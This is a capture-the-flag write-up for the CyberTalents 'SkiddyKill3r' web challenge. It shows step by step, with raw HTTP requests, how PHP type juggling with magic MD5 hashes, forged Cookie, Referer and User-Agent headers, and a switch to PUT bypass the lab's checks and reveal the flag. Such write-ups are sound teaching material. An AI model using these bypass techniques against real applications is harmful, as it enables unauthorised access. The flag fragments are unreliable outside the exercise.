# SkiddyKill3r-Write-up

## {CyberTalents SkiddyKill3r Write-up}
----------------------------------------------------------------------------------------------------------------------------------------------------------------

### Challenge Description ===> Creative Thinking will make getting the flag so much easier 
### Challenge Name= SkiddyKill3r; category= Web Security; Level; Easy 50 pts 
### Maybe we see it easy but it's really need someone is really Creative Thinker...
----------------------------------------------------------------------------------------------------------------------------------------------------------------
# Let's Start
----------------------------------------------------------------------------------------------------------------------------------------------------------------
##### oki i've opened `http://52.28.216.196/skiddy/`

![Image of mahmoudashraf1344](https://github.com/mahmoudashraf1344/SkiddyKill3r-Write-up/blob/main/pts.png)

**As you can see they told us "here you can search about {Admins, Users .. etc}"**
**so you can type in the input "admin" as you can see in the picture**
**we move forward to here `http://52.28.216.196/skiddy/result.php?search=admin`**

![Image of mahmoudashraf1344](https://github.com/mahmoudashraf1344/SkiddyKill3r-Write-up/blob/main/pts1.png)

<h2>Ops Forbidden no problem let's see page source</h2>

![Image of mahmoudashraf1344](https://github.com/mahmoudashraf1344/SkiddyKill3r-Write-up/blob/main/pts2.png)

<h2>we see here</h2>

```
<!-- Your Hint Is admin  To Get Hint Maybe Your Name Or Mine -->
<!-- Momen Is A Good Name Too -->
<!-- Just Try To Brute Them (Manually)-->
```
**So Momen is a good name let's try ?search=Momen**
#### `http://52.28.216.196/skiddy/result.php?search=Momen`

![Image of mahmoudashraf1344](https://github.com/mahmoudashraf1344/SkiddyKill3r-Write-up/blob/main/pts3.png)

<h2>so we see here /hint.php so let's move to it</h2>

#### `http://52.28.216.196/skiddy/hint.php`

![Image of mahmoudashraf1344](https://github.com/mahmoudashraf1344/SkiddyKill3r-Write-up/blob/main/pts4.png)

<h2>oki if you are really Creative Thinker you see "show" is bold and Parameter is good even it was True or False so the parameter show and it can be = "True" or "False"</h2>

<h2>so let's use ?show=True</h2>


**Move To `52.28.216.196/skiddy/hint.php?show=True`**

![Image of mahmoudashraf1344](https://github.com/mahmoudashraf1344/SkiddyKill3r-Write-up/blob/main/pts5.png)

1. **we got robots.txt**
2. **Referer is http://cyberguy**
3. **Cookie: flag=(Magic md5); flag1=(Magic md5)**
```

if (isset($_COOKIE['flag']) &&  isset($_COOKIE['flag1']))
    {
        if($_COOKIE['flag'] != $_COOKIE['flag1'])
        {
            if(md5($_COOKIE['flag'])==md5($_COOKIE['flag1']))
            {
               echo "$flag2";
             }
        }
```
4. **Cookie: flag=True**

<h2>So we can see php is "type juggling"</h2>

**You Can Search About type juggling in php / type coercion**
**So we need a magic hashes/md5**
#### Format = 0e818888003657176127862245791911
#### we can say that's magic hash/md5 if its started by "0e"
#### decrypt this 0e818888003657176127862245791911 = NOOPCJF
#### So Cookie: flag=NOOPCJF; flag1=???????
#### you can get the another flag form here `https://github.com/spaze/hashes/blob/master/md5.md` just be a magic hash/md5
#### so i'll use this `Cookie: flag=NOOPCJF;flag1=MMHUWUV`
----------------------------------------------------------------------------------------------------------------------------------------

### oki i'll open BurpSuite and send request to  `http://52.28.216.196/skiddy/hint.php`


![Image of mahmoudashraf1344](https://github.com/mahmoudashraf1344/SkiddyKill3r-Write-up/blob/main/pts7.png)

#### so we will add `Cookie: flag=Ture` and aslo `Referer: http://cyberguy`
#### Example::---->

```
GET /skiddy/hint.php HTTP/1.1
Host: 52.28.216.196
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://cyberguy
Connection: close
Cookie: flag=True
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
```

### we got this `0xL4ugh{H3r0_` and this is will be part of flag

#### let's move to `http://52.28.216.196/skiddy/robots.txt`

![Image of mahmoudashraf1344](https://github.com/mahmoudashraf1344/SkiddyKill3r-Write-up/blob/main/pts6.png)

#### let's go to `http://52.28.216.196/skiddy/flag.php`

![Image of mahmoudashraf1344](https://github.com/mahmoudashraf1344/SkiddyKill3r-Write-up/blob/main/pts8.png)

### Nothing... let's move to flag1.jpg

![Image of mahmoudashraf1344](https://github.com/mahmoudashraf1344/SkiddyKill3r-Write-up/blob/main/flag1.jpg)

### Nothing too :)

### Finally to `http://52.28.216.196/skiddy/robots.txt.php`

![Image of mahmoudashraf1344](https://github.com/mahmoudashraf1344/SkiddyKill3r-Write-up/blob/main/pts9.png)

## Forbidden :) do you feel that you give up??
### WAIT... LET'S GO TO BURPSUITE
#### i'll send a request to `/skiddy/robots.txt.php`
### The Request will be
```
GET /skiddy/robots.txt.php HTTP/1.1
Host: 52.28.216.196
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```

### oki let's be creative thinkers...
#### we have to add the flag and flag1 cookies
```
GET /skiddy/robots.txt.php HTTP/1.1
Host: 52.28.216.196
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Cookie: flag=NOOPCJF;flag1=MMHUWUV
```

### but no response we can add Referer

```
GET /skiddy/robots.txt.php HTTP/1.1
Host: 52.28.216.196
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://52.28.216.196/skiddy/robots.txt.php
Connection: close
Upgrade-Insecure-Requests: 1
Cookie: flag=NOOPCJF;flag1=MMHUWUV
```

### oki there's no response so we can change the HTTP Request Method

### it's will be this one

```
PUT /skiddy/robots.txt.php HTTP/1.1
Host: 52.28.216.196
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://52.28.216.196/skiddy/robots.txt.php
Connection: close
Upgrade-Insecure-Re
quests: 1
Cookie: flag=NOOPCJF;flag1=MMHUWUV
```

### I use `PUT` and the response will be:

```
Array
(
    [0] => User-agent: *
    [1] => Disallow: /flag.php
    [2] => Allow: /
    [3] => Allow: /index.php
    [4] => Allow: /real_flag.php
    [5] => Allow: /user_check.php
    [6] => User Agent :- G3t_My_Fl@g_N0w()
    [7] => Try To Access user_check File
)
```

### Oki so the flag will be in /user_check.php and the User Agent= G3t_My_Fl@g_N0w()

```
GET /skiddy/user_check.php HTTP/1.1
Host: 52.28.216.196
User-Agent: G3t_My_Fl@g_N0w()
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://52.28.216.196/skiddy/robots.txt.php
Connection: close
Upgrade-Insecure-Requests: 1
Cookie: flag=NOOPCJF;flag1=MMHUWUV
```

# it will response and give you the FLAG...
## Hope you got it
### Hint
#### Flag Format: **xyYXyyy{Yxyx_Yx_Yyyx_Yxy_Yxy}**
